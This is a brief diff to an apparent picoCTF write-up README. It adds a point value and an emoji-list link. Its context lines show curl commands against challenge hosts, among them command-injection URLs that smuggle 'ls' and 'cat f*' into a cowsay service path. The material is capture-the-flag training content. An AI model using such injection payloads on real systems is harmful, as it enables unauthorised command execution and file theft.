@@ -9,7 +9,7 @@ Disallow: /_.html
 $ curl http://jupiter.challenges.picoctf.org:36474/_.html
 ```
 
-## 🕵️‍♀️ - Insp3ct0r
+## 🕵️‍♀️ - Insp3ct0r - `18`
 ```r
 #!/bin/bash
 
@@ -81,3 +81,5 @@ curl -s http://mercury.picoctf.net:55079/.DS_Store | grep -i part | sed "s/^.*: 
 $ curl "https://caas.mars.picoctf.net/cowsay/pwd;ls"
 $ curl "https://caas.mars.picoctf.net/cowsay/xxx;cat f*"
 ```
+
+[github flavor emoji list](https://gist.github.com/rxaviers/7360908)
